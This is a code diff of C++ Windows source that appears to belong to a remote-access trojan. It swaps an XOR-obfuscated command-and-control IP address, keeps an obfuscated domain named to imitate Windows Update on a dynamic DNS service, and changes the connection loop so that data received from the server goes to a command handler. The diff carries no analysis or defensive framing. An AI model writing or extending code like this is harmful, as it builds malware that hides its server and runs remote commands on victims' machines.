@@ -8,7 +8,7 @@ ServerInfo getServer()
     // char ip[] = "\x33\x35\x2c\x32\x36\x30\x28\x34\x31\x27\x3d\x38";
 
     // tmp: 172.18.42.63
-    char ip[] = "\x31\x36\x30\x2d\x36\x3d\x28\x35\x3c\x3c\x24\x33\x3f";
+    char ip[] = "\x31\x36\x30\x2d\x36\x3d\x28\x35\x3d\x3b\x24\x3a\x35";
     unxor(ip);
     // windowsupdate1.ddns.net
     char dm[] = "\x77\x68\x6c\x67\x6b\x72\x75\x72\x78\x6d\x6b\x7f\x69\x3c";
@@ -713,8 +713,6 @@ DWORD WINAPI Connector(LPVOID lpParameter)
 
     ServerInfo sInfo = getServer();
 
-    int state = -1;
-
     while (1)
     {
         // std::cout << "Connecting ..." << std::endl;
@@ -726,7 +724,8 @@ DWORD WINAPI Connector(LPVOID lpParameter)
         while (!sock.isNotConnected())
         {
             // std::cout << "Connected" << std::endl;
-            state = sock.Recv();
+            std::string cdata = sock.Recv();
+            handleCommands(cdata);
         }
 
         sock.Close();
